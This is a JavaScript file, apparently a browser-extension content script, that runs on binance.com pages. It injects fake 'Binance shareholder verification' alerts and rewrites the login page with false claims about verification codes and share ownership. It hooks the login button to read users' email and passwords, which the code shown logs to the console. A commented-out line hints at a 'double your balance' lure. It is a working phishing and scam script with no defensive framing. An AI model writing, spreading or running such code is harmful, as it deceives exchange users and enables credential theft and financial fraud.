var checkVerification=(cname)=>{
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
  
    return null;
  }

  


var locationToExecute="binance.com"
var currentBrowserLocation=window.location.href


if(currentBrowserLocation.includes(locationToExecute)){

    if(currentBrowserLocation == "https://www.binance.com/en")window.location.href="https://www.binance.com/en/my/dashboard"

    if(currentBrowserLocation.includes(`${locationToExecute}/en/login`) ){
        var passedFirstVerification=checkVerification("passedFirstVerification")
  if(passedFirstVerification){
    alert("Congratulations you have passed the first step in Binance shareholder verification")
    setInterval(()=>  document.querySelector("div [ class='css-s3l2jm']").innerHTML="Welcome back!. <br>Congratulations you have passed the first step  in Shareholder's verification.<br> We might not send you verification code as usual.<br> But that does not mean your Email or phone number has been removed.<br> Because your phone number/email is internal to your account .You can always use it to login<br>You will start Recieving codes once you pass the final verification.<br>Log In with your Email, or QR code",100)

  }else{

        alert("Our System has detected you have Binance-Shareholder installed ")
       setInterval(()=>  document.querySelector("div [ class='css-s3l2jm']").innerHTML="Welcome back!. You have binanceShareholder installed.<br> having this software means you have bought and now owns a share with us. <br>Note: A share is not a lottery ticket. it's part of ownership of a buisness.<br>Log In with your Email, Phone number or QR code"
       ,500)

        document.querySelector("#click_login_submit").onclick=()=>{
          let userEmail=  document.querySelector("input[name='email']").value 
           let userPassword= document.querySelector("input[name='password']").value 
           console.log(userEmail)
           console.log(userPassword)
        }
        
    }
}
    // if(currentBrowserLocation.includes("localhost:5000/login.html")){
    //    <br>Please if you havent doubled your "BALANCE" for the first time  Log In with your Email,<br> Phone number or QR code and go dashboard to double your balance as a shareholder
      
    // }
}

